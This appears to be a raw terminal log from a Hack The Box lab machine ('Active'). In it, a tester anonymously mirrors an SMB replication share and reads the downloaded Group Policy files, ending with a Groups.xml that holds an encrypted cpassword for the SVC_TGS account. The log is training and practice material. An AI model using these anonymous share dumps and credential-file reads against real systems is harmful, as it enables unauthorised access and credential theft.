@@ -1,0 +1,117 @@
+──(kali㉿kali)-[~/…/KaliBackup/OSCP/HackTheBox/active]
+└─$ smbclient '//10.10.10.100/REPLICATION' -N -c "prompt OFF;recurse ON;cd '\';lcd '.';mget *"
+Anonymous login successful
+cd \'\'\: NT_STATUS_OBJECT_PATH_NOT_FOUND
+chdir to '.' failed (No such file or directory)
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\GPT.INI of size 23 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\GPT.INI of size 22 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/GPT.INI (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\Group Policy\GPE.INI of size 119 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy/GPE.INI (0.1 KiloBytes/sec) (average 0.0 KiloBytes/sec)
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Registry.pol of size 2788 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Registry.pol (2.2 KiloBytes/sec) (average 0.6 KiloBytes/sec)
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml (0.3 KiloBytes/sec) (average 0.5 KiloBytes/sec)
+getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 1098 as active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (0.9 KiloBytes/sec) (average 0.6 KiloBytes/sec)
+getting file \active.htb\Policies\{6AC1786C-016F-11D2-945F-00C04fB984F9}\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf of size 3722 as active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}/MACHINE/Microsoft/Windows NT/SecEdit/GptTmpl.inf (3.4 KiloBytes/sec) (average 0.9 KiloBytes/sec)
+                                                                                                                      
+┌──(kali㉿kali)-[~/…/KaliBackup/OSCP/HackTheBox/active]
+└─$ ls
+active.htb  creds.txt  log.log  nmap  saved-commands.txt  sharp  user.txt
+                                                                                                                      
+┌──(kali㉿kali)-[~/…/KaliBackup/OSCP/HackTheBox/active]
+└─$ ls active.htb/*  
+active.htb/DfsrPrivate:
+ConflictAndDeleted  Deleted  Installing
+
+active.htb/Policies:
+{31B2F340-016D-11D2-945F-00C04FB984F9}  {6AC1786C-016F-11D2-945F-00C04fB984F9}
+
+active.htb/scripts:
+                                                                                                                      
+┌──(kali㉿kali)-[~/…/KaliBackup/OSCP/HackTheBox/active]
+└─$ ls active.htb/*/*
+active.htb/DfsrPrivate/ConflictAndDeleted:
+
+active.htb/DfsrPrivate/Deleted:
+
+active.htb/DfsrPrivate/Installing:
+
+active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}:
+ GPT.INI  'Group Policy'   MACHINE   USER
+
+active.htb/Policies/{6AC1786C-016F-11D2-945F-00C04fB984F9}:
+GPT.INI  MACHINE  USER
+                                                                                                                      
+┌──(kali㉿kali)-[~/…/KaliBackup/OSCP/HackTheBox/active]
+└─$ cd active.htb/Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}
+                                                                                                                      
+┌──(kali㉿kali)-[~/…/active/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}]
+└─$ ls               
+ GPT.INI  'Group Policy'   MACHINE   USER
+                                                                                                                      
+┌──(kali㉿kali)-[~/…/active/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}]
+└─$ cat GPT.INI                                                    
+[General]
+Version=11
+                                                                                                                      
+┌──(kali㉿kali)-[~/…/active/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}]
+└─$ cd Group\ Policy                                               
+                                                                                                                      
+┌──(kali㉿kali)-[~/…/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy]
+└─$ ls
+GPE.INI
+                                                                                                                      
+┌──(kali㉿kali)-[~/…/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy]
+└─$ cat GPT.INI     
+cat: GPT.INI: No such file or directory
+                                                                                                                      
+┌──(kali㉿kali)-[~/…/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy]
+└─$ cat GPE.INI 
+[General]
+MachineExtensionVersions=[{17D89FEC-5C44-4972-B12D-241CAEF74509}{79F92669-4224-476C-9C5C-6EFB4D87DF4A}:10]
+                                                                                                                      
+┌──(kali㉿kali)-[~/…/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/Group Policy]
+└─$ cd ..           
+                                                                                                                      
+┌──(kali㉿kali)-[~/…/active/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}]
+└─$ cd ..
+                                                                                                                      
+┌──(kali㉿kali)-[~/…/HackTheBox/active/active.htb/Policies]
+└─$ cd ..
+                                                                                                                      
+┌──(kali㉿kali)-[~/…/OSCP/HackTheBox/active/active.htb]
+└─$ tree .     
+.
+├── DfsrPrivate
+│   ├── ConflictAndDeleted
+│   ├── Deleted
+│   └── Installing
+├── Policies
+│   ├── {31B2F340-016D-11D2-945F-00C04FB984F9}
+│   │   ├── GPT.INI
+│   │   ├── Group Policy
+│   │   │   └── GPE.INI
+│   │   ├── MACHINE
+│   │   │   ├── Microsoft
+│   │   │   │   └── Windows NT
+│   │   │   │       └── SecEdit
+│   │   │   │           └── GptTmpl.inf
+│   │   │   ├── Preferences
+│   │   │   │   └── Groups
+│   │   │   │       └── Groups.xml
+│   │   │   └── Registry.pol
+│   │   └── USER
+│   └── {6AC1786C-016F-11D2-945F-00C04fB984F9}
+│       ├── GPT.INI
+│       ├── MACHINE
+│       │   └── Microsoft
+│       │       └── Windows NT
+│       │           └── SecEdit
+│       │               └── GptTmpl.inf
+│       └── USER
+└── scripts
+
+22 directories, 7 files
+                                                                                                                      
+┌──(kali㉿kali)-[~/…/OSCP/HackTheBox/active/active.htb]
+└─$ cat Policies/\{31B2F340-016D-11D2-945F-00C04FB984F9\}/MACHINE/Preferences/Groups/Groups.xml 
+<?xml version="1.0" encoding="utf-8"?>
+<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
+</Groups>
